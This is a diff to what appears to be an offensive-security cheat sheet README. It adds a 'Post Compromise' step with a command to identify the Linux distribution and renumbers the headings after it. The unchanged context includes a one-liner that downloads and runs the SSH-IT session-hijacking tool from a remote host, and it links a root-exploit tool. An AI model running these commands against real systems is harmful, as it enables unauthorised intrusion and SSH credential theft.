@@ -69,6 +69,8 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [with script](#ssswos-anchor)
    1. [with a wrapper script](#ssswor-anchor)
    1. [with SSH-IT](#sshit-anchor)
+1. [Post Compromise](#post-hack)
+   1. [Find out Linux Distribution](#post-hack)
 1. [Miscellaneous](#misc-anchor)
    1. [OSINT Intelligence Gathering](#osint-anchor)
    1. [Tools of the trade](#tools)
@@ -889,8 +891,15 @@ The easiest way is using [https://www.thc.org/ssh-it/](https://www.thc.org/ssh-i
 bash -c "$(curl -fsSL ssh-it.thc.org/x)"
 ```
 
+<a id="post-hack"></a>
+**10.i. Find out Linux Distribution
+
+```sh
+uname -a; lsb-release -a; cat /etc/*release /etc/issue* /proc/version
+```
+
 <a id="osint-anchor"></a>
-**10.i. Intelligence Gathering**
+**11.i. Intelligence Gathering**
 
 | OSINT Hacker Tools ||
 | --- | --- |
@@ -913,7 +922,7 @@ bash -c "$(curl -fsSL ssh-it.thc.org/x)"
 | https://osintframework.com/ | Many OSINT tools |
 
 <a id="Tools"></a>
-**10.ii. Tools**
+**11.ii. Tools**
 
 Exploits
 1. https://github.com/liamg/traitor - Tries various exploits/vulnerabilities to gain root (LPE
@@ -944,7 +953,7 @@ Tunneling
 
  
 <a id="cool-anchor"></a>
-**10.iii. Cool Linux commands**
+**11.iii. Cool Linux commands**
 
 1. https://jvns.ca/blog/2022/04/12/a-list-of-new-ish--command-line-tools/
 1. https://github.com/ibraheemdev/modern-unix
@@ -952,7 +961,7 @@ Tunneling
 
 
 <a id="tmux-anchor"></a>
-**10.iv. tmux**
+**11.iv. tmux**
 
 | | Tmux Cheat Sheet |
 | --- | --- |
@@ -962,7 +971,7 @@ Tunneling
 | Menu | ```Ctrl+b``` + ```>```. Then use ```Ctrl+b``` + ```UP```, ```DOWN```, ```LEFT``` or ```RIGHT``` to move between the panes. |
 
 <a id="useful-anchor"></a>
-**10.v. Useful commands**
+**11.v. Useful commands**
 
 Use ```lsof -Pni``` or ```netstat -antpu``` (or ```ss -antpu```) to list all Internet (_-tu_) connections.
 
